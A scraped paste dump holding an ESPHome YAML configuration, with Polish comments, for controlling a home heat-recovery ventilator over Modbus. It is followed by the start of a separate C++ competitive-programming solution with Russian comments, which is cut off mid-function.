            if (obroty != id(ostatnie_obroty)) {
              id(wentylator_nawiewny).make_call().set_value(obroty).perform();
              id(wentylator_wywiewny).make_call().set_value(obroty).perform();
              id(ostatnie_obroty) = obroty;
            }

            // Zawsze ustaw status, nawet gdy obroty się nie zmieniają
            if (status.empty()) {
              status = ""nocny - bez zmian"";
            }
            id(tryb_auto_status) = status;
            return;
          }

          if (tryb == ""auto"") {
            // **NOWA LOGIKA: Sprawdź najpierw, czy dom jest pusty**
            if (pusty) { // Używamy zmiennej 'pusty' zdeklarowanej i ustawionej wcześniej
              // Jeśli dom jest pusty, wymuś obroty na 1 i zakończ logikę dla trybu auto
              int obroty = 1; // Minimalne obroty dla trybu ""dom pusty""
              if (obroty != id(ostatnie_obroty)) {
                id(wentylator_nawiewny).make_call().set_value(obroty).perform();
                id(wentylator_wywiewny).make_call().set_value(obroty).perform();
                id(ostatnie_obroty) = obroty;
              }
              id(tryb_auto_status) = ""dom pusty"";

            } else {
              // **ISTNIEJĄCA LOGIKA: Uruchamiana tylko, gdy dom NIE jest pusty**
              // Używamy już zdeklarowanych i ustawionych zmiennych hum i co2
              // Usuwamy podwójne deklaracje hum i co2 tutaj!

              // Obroty z logiki CO2
              int obroty_co2 = 3;
              std::string status_co2 = ""normalny"";
              if (co2 > id(co2_auto_high).state) {
                obroty_co2 = 9;
                status_co2 = ""wysoki CO2"";
              } else if (co2 > id(co2_auto_medium).state) {
                obroty_co2 = 6;
                status_co2 = ""średni CO2"";
              } else if (co2 > id(co2_auto_low).state) {
                obroty_co2 = 4;
                status_co2 = ""niski CO2"";
              }

              // Obroty z logiki wilgotności
              int obroty_hum = 3;
              std::string status_hum = """";
              if (hum > id(wilgotnosc_wysoka).state) {
                obroty_hum = 9;
                status_hum = ""wilgotność"";
              } else if (hum < id(wilgotnosc_niska).state) {
                obroty_hum = 3;
              }

              // Wybór wyższych obrotów
              int obroty = std::max(obroty_co2, obroty_hum);

              if (obroty != id(ostatnie_obroty)) {
                id(wentylator_nawiewny).make_call().set_value(obroty).perform();
                id(wentylator_wywiewny).make_call().set_value(obroty).perform();
                id(ostatnie_obroty) = obroty;
              }

              // Ustawienie statusu
              if (obroty == obroty_hum && status_hum != """") {
                id(tryb_auto_status) = ""Tryb auto - "" + status_hum;
              } else {
                id(tryb_auto_status) = ""Tryb auto - "" + status_co2;
              }
            }
          }

# Example configuration entry
psram:
  mode: quad
  speed: 40MHZ


sensor:

  - platform: template
    name: ""Okap - czas do końca""
    id: okap_czas_do_konca
    unit_of_measurement: ""min""
    icon: ""mdi:stove-fan""
    update_interval: 10s # Odświeżaj co 10 sekund dla płynniejszego liczenia
    lambda: |-
      int now_timestamp = id(czas_systemowy).now().timestamp;
      int end_timestamp = id(okap_timer_koniec_timestamp);

      if (end_timestamp > now_timestamp) {
        // Oblicz pozostały czas w sekundach, a następnie w minutach
        int remaining_seconds = end_timestamp - now_timestamp;
        return (float)std::ceil(remaining_seconds / 60.0); // Zaokrągl w górę do najbliższej minuty
      } else {
        return 0; // Jeśli tryb się zakończył lub nieaktywny
      }


  - platform: template
    name: ""Impreza - czas do końca""
    id: impreza_czas_do_konca
    unit_of_measurement: ""min""
    icon: ""mdi:party-popper""
    update_interval: 60s 
    lambda: |-
      int now_timestamp = id(czas_systemowy).now().timestamp;
      int end_timestamp = id(impreza_timer_koniec_timestamp);

      if (end_timestamp > now_timestamp) {
        // Oblicz pozostały czas w sekundach, a następnie w minutach
        int remaining_seconds = end_timestamp - now_timestamp;
        return (float)std::ceil(remaining_seconds / 60.0); // Zaokrągl w górę do najbliższej minuty
      } else {
        return 0; // Jeśli tryb się zakończył lub nieaktywny
      }

  - platform: template
    name: ""Przewietrzanie - czas do końca""
    id: przewietrzanie_czas_do_konca
    unit_of_measurement: ""min""
    icon: ""mdi:timer-sand""
    update_interval: 60s # Odświeżaj co 10 sekund dla płynniejszego liczenia
    lambda: |-
      int now_timestamp = id(czas_systemowy).now().timestamp;
      int end_timestamp = id(przewietrzanie_timer_koniec_timestamp);

      if (end_timestamp > now_timestamp) {
        // Oblicz pozostały czas w sekundach, a następnie w minutach
        int remaining_seconds = end_timestamp - now_timestamp;
        return (float)std::ceil(remaining_seconds / 60.0); // Zaokrągl w górę do najbliższej minuty
      } else {
        return 0; // Jeśli przewietrzanie się zakończyło lub nieaktywne
      }

  # Nowy sensor do odczytu predkosci okapu z Home Assistant
  - platform: homeassistant
    name: ""Predkosc Okapu z HA""
    id: okap_predkosc_ha
    entity_id: fan.fan_hood # <--- ZMIEŃ TO NA PRAWIDŁOWE entity_id TWOJEGO OKAPU W HA!
    attribute: percentage # Odczytujemy atrybut 'percentage' z encji typu fan w HA
    unit_of_measurement: ""%""
    accuracy_decimals: 0
    internal: true # Ten sensor jest uzywany tylko wewnetrznie przez ESPHome


  - platform: template
    name: ""Maksymalna Wilgotność w Domu""
    id: max_humidity_all_sensors # Nowy ID dla sensora maksymalnej wilgotności
    unit_of_measurement: ""%""
    accuracy_decimals: 1
    update_interval: 60s # Ustaw interwał aktualizacji np. na 10 sekund
    lambda: |-
      float max_h = 0.0;

      if (id(wilgotnosc_lazienka).has_state()) {
          max_h = std::max(max_h, id(wilgotnosc_lazienka).state);
      }
      if (id(wilgotnosc_kuchnia).has_state()) {
          max_h = std::max(max_h, id(wilgotnosc_kuchnia).state);
      }
      if (id(wilgotnosc_kotlownia).has_state()) {
          max_h = std::max(max_h, id(wilgotnosc_kotlownia).state);
      }

      //Jeśli masz więcej sensorów, dodaj kolejne bloki if i std::max()

      return max_h;


  - platform: debug
    free:
      name: ""Heap Free""
    block:
      name: ""Heap Max Block""
    loop_time:
      name: ""Loop Time""
    psram:
      name: ""Free PSRAM""
    cpu_frequency:
      name: ""CPU Frequency""
  
  
  - platform: internal_temperature
    name: ""Internal Temperature""

  - platform: uptime
    id: uptime_sensor
    internal: True
    update_interval: 60s
    on_raw_value:
      then:
        - text_sensor.template.publish:
            id: uptime_human
            state: !lambda |-
              int seconds = round(id(uptime_sensor).raw_state);
              int days = seconds / (24 * 3600);
              seconds = seconds % (24 * 3600);
              int hours = seconds / 3600;
              seconds = seconds % 3600;
              int minutes = seconds /  60;
              seconds = seconds % 60;
              return (
                (days ? to_string(days) + ""d "" : """") +
                (hours ? to_string(hours) + ""h "" : """") +
                (minutes ? to_string(minutes) + ""m "" : """") +
                (to_string(seconds) + ""s"")
              ).c_str();

  - platform: homeassistant
    id: co2_value
    entity_id: sensor.co2_salon
    internal: true

  - platform: homeassistant
    id: wilgotnosc_lazienka
    entity_id: sensor.atc_lazienka_parter_humidity
    internal: true

  - platform: homeassistant
    entity_id: sensor.ble_kuchnia_humidity
    id: wilgotnosc_kuchnia
    internal: true

  - platform: homeassistant
    entity_id: sensor.atc_04e8_humidity
    id: wilgotnosc_kotlownia
    internal: true


  - platform: template
    name: ""Wykonane korekty (w tej godzinie)""
    id: licznik_korekt_sensor
    unit_of_measurement: ""x""
    lambda: 'return id(licznik_korekt);'
    update_interval: 60s

  - platform: template
    name: ""Pozostale korekty""
    id: licznik_korekt_pozostale
    unit_of_measurement: ""x""
    lambda: 'return id(limit_korekt_na_godzine) - id(licznik_korekt);'
    update_interval: 60s
  
  
  
  #####################################################################
  #                  KANAL NAWIEWU (POWIETRZE WCHODZACE)             #
  #####################################################################

  # 1. Czujnik SDP810 dla nawiewu - surowe ciśnienie
  - platform: sdp3x
    name: ""Cisnienie Roznicowe Nawiew""
    id: nawiew_raw_pressure
    address: 0x25
    i2c_id: bus_a # Zmień na ID Twojej magistrali dla nawiewu
    update_interval: 5s
    filters:
      # Pierwszy filtr w liście
      - exponential_moving_average:
          alpha: 0.7 # Wcięcie 2 spacje pod 'exponential_moving_average'
      # Drugi filtr w liście. Wcięcie jak pierwszy filtr (myślnik w tej samej kolumnie).
    #  - lambda: 'return x > 0 ? x : 0;'
      
    # 2. Sensor szablonowy - oblicza przepływ dla nawiewu w m3/h
  - platform: template
    name: ""Przeplyw Nawiew m3/h""
    id: nawiew_airflow_m3_h
    update_interval: 5s
    icon: ""mdi:air-filter""
    unit_of_measurement: ""m³/h""
    lambda: |-
      // Stałe fizyczne
      const float p_atm = 101325.0;    // Ciśnienie atmosferyczne w Pa
      const float R = 287.05;          // Stała gazowa dla powietrza J/(kg·K)

      // Pobierz temperaturę (°C) i przelicz na Kelwiny
      float temp_c = id(nawiew_temp).state;
      float temp_k = temp_c + 273.15;

      // Oblicz gęstość powietrza (rho)
      float rho = p_atm / (R * temp_k);

      // Średnica i pole przekroju kanału (0.2 m)
      float duct_diameter = 0.2;
      float duct_radius = duct_diameter / 2.0;
      float duct_area = M_PI * pow(duct_radius, 2.0);

      // Odczytaj ciśnienie w hPa i przelicz na Pa
      float pressure_hpa = id(nawiew_raw_pressure).state;
      float pressure_pa = pressure_hpa * 100.0;

      // Sprawdź, czy ciśnienie dodatnie
      if (pressure_pa <= 0) {
        return 0;
      }

      // Oblicz prędkość i przepływ
      float velocity_mps = sqrt((2.0 * pressure_pa) / rho);
      float flow_m3_s = velocity_mps * duct_area;

      // Przelicz na m³/h
      return flow_m3_s * 3600.0;

  #####################################################################
  #                  KANAL WYWIEWU (POWIETRZE WYCHODZACE)             #
  #####################################################################

  # 3. Czujnik SDP810 dla wywiewu - surowe ciśnienie
  - platform: sdp3x
    name: ""Cisnienie Roznicowe Wywiew""
    id: wywiew_raw_pressure
    address: 0x25
    i2c_id: bus_b # Zmień na ID Twojej magistrali dla wywiewu
    update_interval: 5s
    filters:
      - exponential_moving_average:
          alpha: 0.7
      #- lambda: 'return x > 0 ? x : 0;'
      
  # 4. Sensor szablonowy - oblicza przepływ dla wywiewu w m3/h
  - platform: template
    name: ""Przeplyw Wywiew m3/h""
    id: wywiew_airflow_m3_h
    icon: ""mdi:air-filter""
    unit_of_measurement: ""m³/h""
    update_interval: 5s
    lambda: |-
      // Stałe fizyczne
      const float p_atm = 101325.0;    // Ciśnienie atmosferyczne w Pa
      const float R = 287.05;          // Stała gazowa dla powietrza J/(kg·K)

      // Pobierz temperaturę wywiewu i przelicz na Kelwiny
      float temp_c = id(wywiew_temp).state;
      float temp_k = temp_c + 273.15;

      // Oblicz gęstość powietrza (kg/m³) z równania gazu doskonałego
      float rho = p_atm / (R * temp_k);

      // Parametry kanału
      float duct_diameter = 0.2; // Średnica kanału (m)
      float duct_radius = duct_diameter / 2.0;
      float duct_area = M_PI * pow(duct_radius, 2.0);  // Pole przekroju (m²)

      // Ciśnienie dynamiczne w hPa → Pa
      float pressure_hpa = id(wywiew_raw_pressure).state;
      float pressure_pa = pressure_hpa * 100.0;

      // Jeśli ciśnienie ≤ 0, zwróć 0
      if (pressure_pa <= 0) {
        return 0.0;
      }

      // Oblicz prędkość przepływu (m/s)
      float velocity_mps = sqrt((2.0 * pressure_pa) / rho);

      // Oblicz przepływ objętościowy (m³/s) → przelicz na m³/h
      float flow_m3_s = velocity_mps * duct_area;

      return flow_m3_s * 3600.0;


# 5. Sensor szablonowy - oblicza różnicę przepływu (Nawiew - Wywiew)
  - platform: template
    name: ""Roznica Przeplywu""
    id: flow_difference_m3_h
    icon: ""mdi:compare-arrows""
    unit_of_measurement: ""m³/h""
    update_interval: 10s
    lambda: |-
      if (isnan(id(nawiew_airflow_m3_h).state) || isnan(id(wywiew_airflow_m3_h).state)) {
        return 0.0;
      }
      return id(nawiew_airflow_m3_h).state - id(wywiew_airflow_m3_h).state;
    on_value:
      - if:
          condition:
            # 1. Sprawdź, czy balans przepływu jest włączony
            - switch.is_on: balans_przeplywu_switch
            # 2. Sprawdź, czy minął wystarczający czas od ostatniej korekty
            - lambda: |-
                // Czas opóźnienia w minutach (np. 5 minut)
                const int delay_minutes = 5; // <--- TUTAJ ZMIENIASZ CZAS OPÓŹNIENIA W MINUTACH
                const int delay_seconds = delay_minutes * 60; // Przeliczenie na sekundy

                time_t current_time = id(czas_systemowy).now().timestamp;
                int last_correction_time = id(ostatni_timestamp_korekty);
                return (current_time - last_correction_time) >= delay_seconds;
          then:
            - logger.log:
                format: ""Różnica przepływu: %.1f m³/h""
                args: [""id(flow_difference_m3_h).state""]

            - if:
                condition:
                  lambda: return id(flow_difference_m3_h).state > 30; # Nadciśnienie - nawiew o 25 m³/h większy od wywiewu
                then:
                  - script.execute:
                      id: sprawdz_ograniczenie_korekt
                      korekta_id: 1 # Wywołuje korekta_do_nadcisnienia (zwiększa wywiew)

            - if:
                condition:
                  lambda: return id(flow_difference_m3_h).state < -30; # Podciśnienie - wywiew o 25 m³/h większy od nawiewu
                then:
                  - script.execute:
                      id: sprawdz_ograniczenie_korekt
                      korekta_id: 2 # Wywołuje korekta_do_podcisnienia (zmniejsza wywiew)



 ############   PZEM-004T V3 Reku
  - platform: pzemac
    modbus_id: mod_bus_pzem
    address: 1
    id: pzemac_1
    current:
      name: ""Rekuperator prąd""
      accuracy_decimals: 2 
      id: reku_prad
    voltage:
      name: ""Rekuperator napięcie""
      unit_of_measurement: V
      accuracy_decimals: 2
      id: reku_napiecie
    energy:
      name: ""Rekuperator zużycie energii""
      filters:
        # Wh to kWh is 0.001
        - multiply: 0.001
      unit_of_measurement: kWh
      accuracy_decimals: 3
      id: pg_energia
    power:
      name: ""Rekuperator moc""
      unit_of_measurement: W
      accuracy_decimals: 2
      id: reku_moc
    frequency:
      name: ""Rekuperator częstotliwość""
      unit_of_measurement: Hz
      accuracy_decimals: 2
    power_factor:
      name: ""Rekuperator współczynnik mocy""
      accuracy_decimals: 2
      id: reku_power_factor
    update_interval: 5s

  - platform: total_daily_energy
    name: ""Rekuperator dzienne zużycie energii""
    power_id: pg_energia
    unit_of_measurement: ""kWh""
    accuracy_decimals: 3
    id: pg_daily_kwh
    icon: mdi:counter
    device_class: energy
    filters:
      # Multiplication factor from W to kW is 0.001
      - multiply: 0.001

  - platform: template
    name: ${friendly_name} sprawność
    unit_of_measurement: ""%""
    lambda: |-
      float dzielnik = id(wywiew_temp).state - id(czerpnia_temp).state;
      if (dzielnik != 0) {
        float dzielna = id(nawiew_temp).state - id(czerpnia_temp).state;
        return (dzielna / dzielnik) * 100.0;
      } else {
        // Zwróć 0 lub inną domyślną wartość, gdy nie można wykonać obliczeń
        return 0;
      }
    accuracy_decimals: 1
    update_interval: 15s

   # sprawność temperaturowa = (T2-T1)/(T3-T1)
   # T1 – temperatura powietrza zewnętrznego (nawiewanego przed wymiennikiem) [°C]
   # T2 – temperatura powietrza nawiewanego za wymiennikiem [°C]
   # T3– temperatura powietrza wywiewanego z pomieszczeń przed wymiennikiem [°C]

  - platform: wifi_signal
    name: ${friendly_name} RSSI
    update_interval: 60s
 
  - platform: modbus_controller
    modbus_controller_id: reventon_reku
    name: ${friendly_name} Temperatura wywiew
    id: wywiew_temp
    register_type: holding
    address: 0x000c #12
    unit_of_measurement: ""°C""
    device_class: ""temperature""
    value_type: U_WORD
    filters:
      - lambda: return x - 40.0;
    #accuracy_decimals: 1
 
  - platform: modbus_controller
    modbus_controller_id: reventon_reku
    name: ${friendly_name} Temperatura czerpnia
    id: czerpnia_temp
    register_type: holding
    address: 0x000d #13
    unit_of_measurement: ""°C""
    device_class: ""temperature""
    value_type: U_WORD
    filters:
      - lambda: return x - 40.0;
    #accuracy_decimals: 1 
    
  - platform: modbus_controller
    modbus_controller_id: reventon_reku
    name: ${friendly_name} Temperatura wyrzutnia
    id: wyrzutnia_temp
    register_type: holding
    address: 0x000f #15
    unit_of_measurement: ""°C""
    device_class: ""temperature""
    value_type: U_WORD
    filters:
      - lambda: return x - 40.0;
    #accuracy_decimals: 1 
     
  - platform: modbus_controller
    modbus_controller_id: reventon_reku
    name: ${friendly_name} Temperatura nawiew
    id: nawiew_temp
    register_type: holding
    address: 0x000e #14
    unit_of_measurement: ""°C""
    device_class: ""temperature""
    value_type: U_WORD
    filters:
      - lambda: return x - 40.0;
    #accuracy_decimals: 1 
   
  - platform: modbus_controller
    modbus_controller_id: reventon_reku
    name: ${friendly_name} CO2
    id: co2_reku
    register_type: holding
    address: 0x0300 #768
    unit_of_measurement: ""ppm""
    device_class: ""carbon_dioxide""
    value_type: U_WORD
    skip_updates: 100    
    #accuracy_decimals: 1 
     
  - platform: modbus_controller
    modbus_controller_id: reventon_reku
    name: ${friendly_name} Fan running time
    id: fan_running_time
    register_type: holding
    address: 0x0301 #769
    unit_of_measurement: ""min""
    value_type: U_WORD
    filters:
      - lambda: return x * 6.0;
    skip_updates: 12   
    #accuracy_decimals: 1 
     
  - platform: modbus_controller
    modbus_controller_id: reventon_reku
    name: ${friendly_name} Wilgotność
    id: wilgotnosc_reku
    register_type: holding
    address: 0x0302 #770
    unit_of_measurement: ""%""
    device_class: ""humidity""
    value_type: U_WORD
    skip_updates: 10      
    #accuracy_decimals: 1 
     
binary_sensor:
    - platform: homeassistant
      id: okno_salon
      entity_id: binary_sensor.shelly_blu_door_window_ce04_window

    - platform: homeassistant
      id: okno_salon2
      entity_id: binary_sensor.shelly_blu_door_window_24b7_window

    - platform: homeassistant
      id: okno_gabinet_l
      entity_id: binary_sensor.shelly_blu_door_window_cc52_window

    - platform: homeassistant
      id: okno_gabinet_p
      entity_id: binary_sensor.shelly_blu_door_window_882d_window

    - platform: homeassistant
      id: okno_lazienka
      entity_id: binary_sensor.shelly_blu_door_window_06b3_window

    - platform: homeassistant
      id: dom_pusty
      entity_id: input_boolean.dom_pusty
      internal: False
      name: Dom pusty

    - platform: template
      id: czy_jakies_okno_otwarte
      name: ""Czy jakiekolwiek okno otwarte""
      lambda: |-
        return id(okno_salon).state || id(okno_salon2).state || id(okno_gabinet_l).state 
        || id(okno_gabinet_p).state || id(okno_lazienka).state;
      #on_press:
       # then:
        #  - if:
         #     condition:
          #      lambda: return id(aktywny_tryb) != ""okno"";
           #   then:
            #    - logger.log: ""Wykryto otwarte okno — przełączam na tryb OKNO""
             #   - script.execute:
              #      id: set_mode
               #     tryb: ""okno""


      #on_release:
       # then:
        #  - if:
         #     condition:
          #      lambda: return id(aktywny_tryb) == ""okno"";
           #   then:
            #    - logger.log: ""Wszystkie okna zamknięte — przywracam tryb AUTO""
             #   - script.execute:
              #      id: set_mode
               #     tryb: ""auto""

    - platform: status
      name: ${friendly_name} Logger Status

    - platform: modbus_controller
      modbus_controller_id: reventon_reku
      name: ${friendly_name} On/Off status 
      #device_class: running
      register_type: holding
      #entity_category: diagnostic
      address: 0x0009 #9
      #bitmask: 0x1
      
    - platform: modbus_controller
      modbus_controller_id: reventon_reku
      name: ${friendly_name} Auto restart status 
      #device_class: running
      register_type: holding
      #entity_category: diagnostic
      address: 0x0000 #0
      #bitmask: 0x1
      
    - platform: modbus_controller
      modbus_controller_id: reventon_reku
      name: ${friendly_name} Nagrzewnica status 
      #device_class: running
      register_type: holding
      #entity_category: diagnostic
      address: 0x0001 #1
      #bitmask: 0x1
      
    - platform: modbus_controller
      modbus_controller_id: reventon_reku
      name: ${friendly_name} Zewnętrzny sygnał ON/OFF 
      #device_class: running
      register_type: holding
      #entity_category: diagnostic
      address: 0x0010 #16
      #bitmask: 0x1
      
    - platform: modbus_controller
      modbus_controller_id: reventon_reku
      name: ${friendly_name} Sygnał ON/OFF czujnika CO2
      #device_class: running
      register_type: holding
      #entity_category: diagnostic
      address: 0x0011 #17
      #bitmask: 0x1
  
switch:
  - platform: template
    name: ""Tryb przewietrzania""
    id: tryb_przewietrzania_switch
    optimistic: true
    restore_mode: RESTORE_DEFAULT_OFF
    on_turn_on:
      - script.execute: wlacz_przewietrzanie
    on_turn_off:
      - script.execute: zakoncz_przewietrzanie

  - platform: template
    name: ""Automatyczny Balans Przeplywu""
    id: balans_przeplywu_switch
    icon: ""mdi:light-switch""
    # Ustawia przełącznik na wyłączony po restarcie ESP
    restore_mode: RESTORE_DEFAULT_OFF
    optimistic: true

  - platform: template
    name: ${friendly_name} switch
    id: reku_switch
    restore_mode: RESTORE_DEFAULT_OFF
    lambda: |-
      if (id(reku_on_off_switch).state==1) {
        return true;
      } else {
        return false;
      }
    turn_on_action:
      - number.set:
          id: reku_on_off_switch
          value: 1
    turn_off_action:
      - number.set:
          id: reku_on_off_switch
          value: 0 

number:
    - platform: template
      name: ""Czas trwania trybu Impreza""
      id: impreza_czas_trwania_godz
      min_value: 1
      max_value: 8
      step: 1
      unit_of_measurement: ""h""
      mode: BOX
      restore_value: yes
      initial_value: 5 # Domyslny czas trwania 5 godzin
      optimistic: true


    - platform: template
      name: ""Czas trwania trybu Okap""
      id: okap_czas_trwania_min
      min_value: 5
      max_value: 60
      step: 5
      unit_of_measurement: ""min""
      mode: BOX
      restore_value: yes
      initial_value: 15 # Domyslny czas trwania 15 minut
      optimistic: true

    - id: co2_auto_high
      name: ""CO2 Auto High""
      min_value: 400
      max_value: 2000
      step: 10
      unit_of_measurement: ""ppm""
      optimistic: true
      initial_value: 1200
      platform: template
      mode: box

    - id: co2_auto_medium
      name: ""CO2 Auto Medium""
      min_value: 400
      max_value: 2000
      step: 10
      unit_of_measurement: ""ppm""
      optimistic: true
      initial_value: 1000
      platform: template
      mode: box

    - id: co2_auto_low
      name: ""CO2 Auto Low""
      min_value: 400
      max_value: 2000
      step: 10
      unit_of_measurement: ""ppm""
      optimistic: true
      initial_value: 800
      platform: template
      mode: box

    - id: co2_nocny_high
      name: ""CO2 Nocny High""
      min_value: 400
      max_value: 2000
      step: 10
      unit_of_measurement: ""ppm""
      optimistic: true
      initial_value: 800
      platform: template
      mode: box

    - id: co2_nocny_low
      name: ""CO2 Nocny Low""
      min_value: 400
      max_value: 2000
      step: 10
      unit_of_measurement: ""ppm""
      optimistic: true
      initial_value: 700
      platform: template
      mode: box

    - id: wilgotnosc_wysoka
      name: ""Wilgotność Wysoka""
      min_value: 40
      max_value: 100
      step: 1
      unit_of_measurement: ""%""
      optimistic: true
      initial_value: 70
      platform: template
      mode: box

    - id: wilgotnosc_niska
      name: ""Wilgotność Niska""
      min_value: 30
      max_value: 100
      step: 1
      unit_of_measurement: ""%""
      optimistic: true
      initial_value: 55
      platform: template
      mode: box

    - id: wilgotnosc_nocna_high
      name: ""Wilgotność nocna wysoka""
      min_value: 60
      max_value: 100
      step: 1
      unit_of_measurement: ""%""
      optimistic: true
      initial_value: 80
      platform: template
      mode: box

    - id: wilgotnosc_nocna_low
      name: ""Wilgotność nocna niska""
      min_value: 30
      max_value: 100
      step: 1
      unit_of_measurement: ""%""
      optimistic: true
      initial_value: 65
      platform: template
      mode: box
 
    - platform: template
      name: ""Czas przewietrzania""
      id: czas_przewietrzania_minuty
      min_value: 1
      max_value: 30
      step: 1
      unit_of_measurement: ""min""
      optimistic: true
      restore_value: true
      initial_value: 10
      mode: box


    - platform: modbus_controller
      modbus_controller_id: reventon_reku
      id: reku_on_off_switch
      address: 0x0009 #9
      value_type: U_WORD
      min_value: 0
      max_value: 1
      step: 1
      mode: box
      internal: true

    - platform: modbus_controller
      modbus_controller_id: reventon_reku
      name: ${friendly_name} Temperatura X otwarcia bypass’u
      address: 0x0002 #2
      unit_of_measurement: ""°C""
      id: temp_x_bypass
      value_type: U_WORD
      min_value: 5
      max_value: 30
      step: 1
      mode: box
      entity_category: config

      
    - platform: modbus_controller
      modbus_controller_id: reventon_reku
      name: ${friendly_name} Temperatura Y otwarcia bypass’u
      address: 0x0003 #3
      unit_of_measurement: ""°C""
      id: temp_y_bypass
      value_type: U_WORD
      min_value: 2
      max_value: 15
      step: 1
      mode: box
      entity_category: config      
      
    - platform: modbus_controller
      modbus_controller_id: reventon_reku
      name: ${friendly_name} Interwał odszraniania
      address: 0x0004 #4
      unit_of_measurement: ""min""
      #device_class: ""temperature""
      id: defrosting_interval
      value_type: U_WORD
      min_value: 15
      max_value: 99
      step: 1
      mode: box
      entity_category: config      
      
    - platform: modbus_controller
      modbus_controller_id: reventon_reku
      name: ${friendly_name} Temperatura odszraniania
      address: 0x0005 #5
      unit_of_measurement: ""°C""
      id: defrosting_enter_temperature
      value_type: U_WORD
      min_value: -9
      max_value: 5
      lambda: ""return x - 40.0;""
      write_lambda: ""return x + 40.0;""
      step: 1
      mode: box
      entity_category: config      
      
    - platform: modbus_controller
      modbus_controller_id: reventon_reku
      name: ${friendly_name} Czas odszraniania
      address: 0x0006 #6
      unit_of_measurement: ""min""
      #device_class: ""temperature""
      id: defrost_duration_time
      value_type: U_WORD
      min_value: 2
      max_value: 20
      step: 1
      mode: box
      entity_category: config      
      
    - platform: modbus_controller
      modbus_controller_id: reventon_reku
      name: ${friendly_name} Czujnik CO2
      address: 0x0007 #7
      unit_of_measurement: ""ppm""
      id: co2_set
      value_type: U_WORD
      min_value: 00
      max_value: 2500
      lambda: ""return x * 10.0;""
      write_lambda: ""return x / 10.0;""
      step: 1
      mode: box
      entity_category: config  
      skip_updates: 20       
      
    - platform: modbus_controller
      modbus_controller_id: reventon_reku
      name: ${friendly_name} Wentylator nawiewny
      icon: ""mdi:fan-speed-1""
      address: 0x000a #10
      lambda: |-
         if (x == 2) {
         return 1;
         }
         if (x == 3) {
         return 2;
         }
         if (x == 5) {
         return 3;           
         }
         if (x == 8) {
         return 4;           
         }         
         if (x == 9) {
         return 5;           
         }           
         if (x == 10) {
         return 6;           
         }             
         if (x == 11) {
         return 7;           
         }            
         if (x == 12) {
         return 8;           
         }
         if (x == 13) {
         return 9;           
         }
         if (x == 14) {
         return 10;           
         } else {
          return NAN;
         }
      write_lambda: |-
         if (x == 1) {
         return 2;
         }
         if (x == 2) {
         return 3;
         }
         if (x == 3) {
         return 5;           
         }
         if (x == 4) {
         return 8;           
         }         
         if (x == 5) {
         return 9;           
         }           
         if (x == 6) {
         return 10;           
         }             
         if (x == 7) {
         return 11;           
         }            
         if (x == 8) {
         return 12;           
         }
         if (x == 9) {
         return 13;           
         }
         if (x == 10) {
         return 14;           
         } else {
          return NAN;
         }  
      #unit_of_measurement: ""%""
      id: wentylator_nawiewny
      value_type: U_WORD
      entity_category: """"
      min_value: 1
      max_value: 10
      step: 1
      mode: slider

    - platform: modbus_controller
      modbus_controller_id: reventon_reku
      name: ${friendly_name} Wentylator wywiewny
      icon: ""mdi:fan-speed-1""
      address: 0x000b #11
      lambda: |-
         if (x == 2) {
         return 1;
         }
         if (x == 3) {
         return 2;
         }
         if (x == 5) {
         return 3;           
         }
         if (x == 8) {
         return 4;           
         }         
         if (x == 9) {
         return 5;           
         }           
         if (x == 10) {
         return 6;           
         }             
         if (x == 11) {
         return 7;           
         }            
         if (x == 12) {
         return 8;           
         }
         if (x == 13) {
         return 9;           
         }
         if (x == 14) {
         return 10;           
         } else {
          return NAN;
         }
      write_lambda: |-
         if (x == 1) {
         return 2;
         }
         if (x == 2) {
         return 3;
         }
         if (x == 3) {
         return 5;           
         }
         if (x == 4) {
         return 8;           
         }         
         if (x == 5) {
         return 9;           
         }           
         if (x == 6) {
         return 10;           
         }             
         if (x == 7) {
         return 11;           
         }            
         if (x == 8) {
         return 12;           
         }
         if (x == 9) {
         return 13;           
         }
         if (x == 10) {
         return 14;           
         } else {
          return NAN;
         }  
      #unit_of_measurement: ""%""
      id: wentylator_wywiewny
      value_type: U_WORD
      entity_category: """"
      min_value: 1
      max_value: 10
      step: 1
      mode: slider    
      
select:
  - platform: template
    name: ""Tryb rekuperatora (ESP)""
    id: tryb_select_esp
    optimistic: true
    options:
      - auto
      - normalny
      - nocny
      - impreza
      - urlopowy
      - serwisowy
      - okno
      - okap_auto
    initial_option: auto
    restore_value: yes
    on_value:
      then:
        - script.execute:
            id: set_mode
            mode: !lambda 'return x;'
            target_reku_speed: 0

  - platform: modbus_controller
    modbus_controller_id: reventon_reku
    name: ${friendly_name} Ustawienia wielofunkcyjne
    icon: ""mdi:fan""
    id: multi_sel
    address:  0x0018 #24
    entity_category: config
    value_type: U_WORD
    optimistic: false
    optionsmap:
      ""Kasuj"": 0
      ""Usunięcie alarmu filtra"": 1
      ""Usunięcie harmonogramu tygodniowego"": 2
      
  - platform: modbus_controller
    modbus_controller_id: reventon_reku
    name: ${friendly_name} Ustawienia alarmu filtra
    icon: ""mdi:fan""
    id: filter_sel
    address:  0x0019 #25
    entity_category: config
    value_type: U_WORD
    optimistic: false
    optionsmap:
      ""45 dni"": 0
      ""60 dni"": 1
      ""90 dni"": 2
      ""180 dni"": 3

"
cz04SFkg,WTF,Boss239,C++,Wednesday 23rd of July 2025 12:05:35 PM CDT,"#include <bits/stdc++.h>
using namespace std;
using ll = long long;

void solve() {
    int n, m; cin >> n >> m;
    vector<int> ifless(n, 1), ifmore(n, 1);
	// ifless - если меньше остальных, ifmore - если больше остальных. Изначально все могут быть и теми, и теми.
    for (int j = 0; j < m; ++j) {
        int q; cin >> q;
        vector<int> cnt(n, 0);
		// считываем сколько раз он на левой чаше сравнения (отрицательное число значит, что он на противоположной), здесь также учитывается возможность того, что какой-то человек в сравнении участвует несколько раз
        for (int i = 0; i < q; ++i) {
            int a; cin >> a; a--;
            cnt[a]++;
        }
		// сначала добавляем тех, что слева
        for (int i = 0; i < q; ++i) {
            int a; cin >> a; a--;
            cnt[a]--;
        }
		// затем вычитаем тех что справа
        char res; cin >> res;
		// теперь считываем знак
        if (res == '=') {
            for (int i = 0; i < n; ++i) {
                if (cnt[i] != 0) {
                    ifless[i] = 0; ifmore[i] = 0;
                }
            }
        }
		// если равенство, то это значит, что все, у кого по итогу ненулевой вклад равны, а значит больше не могут быть особенными
        else if (res == '>') {
            for (int i = 0; i < n; ++i) {
                if (cnt[i] <= 0) { ifmore[i] = 0; }
                if (cnt[i] >= 0) { ifless[i] = 0; }
            }
        }
		// если больше, то если у кого-то вклад не больше нуля, то его не может быть слева, а значит он не может весить больше, так как слева уже есть человек, который весит больше. По аналогии с меньше и правой частью
        else {
            for (int i = 0; i < n; ++i) {
